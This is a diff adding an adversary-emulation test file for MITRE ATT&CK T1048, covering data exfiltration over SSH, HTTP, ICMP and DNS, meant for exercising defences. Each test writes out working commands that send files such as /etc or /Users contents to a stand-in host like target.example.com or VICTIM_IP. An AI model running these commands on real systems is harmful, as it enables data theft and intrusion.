@@ -1,0 +1,133 @@
+---
+attack_technique: T1048
+display_name: Exfiltration Over Alternative Protocol
+
+atomic_tests:
+- name: Exfiltration Over Alternative Protocol - SSH
+  description: |
+    Input a domain and test Exfiltration over SSH
+
+    Remote to Local
+
+    Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.
+
+  supported_platforms:
+    - macos
+    - linux
+
+  input_arguments:
+    domain:
+      description: target SSH domain
+      type: url
+      default: target.example.com
+
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
+
+- name: Exfiltration Over Alternative Protocol - SSH
+  description: |
+    Input a domain and test Exfiltration over SSH
+
+    Local to Remote
+
+    Upon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.
+
+  supported_platforms:
+    - macos
+    - linux
+
+  input_arguments:
+    domain:
+      description: target SSH domain
+      type: url
+      default: target.example.com
+    user_name:
+      description: username for domain
+      type: string
+      default: atomic
+    password:
+      description: password for user
+      type: string
+      default: atomic
+
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
+
+- name: Exfiltration Over Alternative Protocol - HTTP
+  description: |
+    A firewall rule (iptables or firewalld) will be needed to allow exfiltration on port 1337.
+
+    Upon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.
+
+  supported_platforms:
+    - macos
+    - linux
+
+  executor:
+    name: manual
+    steps: |
+      1. Victim System Configuration:
+
+          mkdir /tmp/victim-staging-area
+          echo "this file will be exfiltrated" > /tmp/victim-staging-area/victim-file.txt
+
+      2. Using Python to establish a one-line HTTP server on victim system:
+
+          cd /tmp/victim-staging-area
+          python -m SimpleHTTPServer 1337
+
+      3. To retrieve the data from an adversary system:
+
+          wget http://VICTIM_IP:1337/victim-file.txt
+
+- name: Exfiltration Over Alternative Protocol - ICMP
+  description: |
+    Exfiltration of specified file over ICMP protocol.
+
+    Upon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    input_file:
+      description: Path to file to be exfiltrated.
+      type: Path
+      default: C:\Windows\System32\notepad.exe
+    ip_address:
+      description: Destination IP address where the data should be sent.
+      type: String
+      default: 127.0.0.1
+
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }
+
+- name: Exfiltration Over Alternative Protocol - DNS
+  description: |
+    Exfiltration of specified file over DNS protocol.
+  supported_platforms:
+    - linux
+
+  executor:
+    name: manual
+    steps: |
+      1. On the adversary machine run the below command.
+
+          tshark -f "udp port 53" -Y "dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches ".domain"" >> received_data.txt
+
+      2. On the victim machine run the below commands.
+
+          xxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done
+          
+      3. Once the data is received, use the below command to recover the data.
+
+          cat output_file | cut -d "A" -f 2 | cut -d " " -f 2 | cut -d "." -f 1 | sort | uniq | xxd -p -r
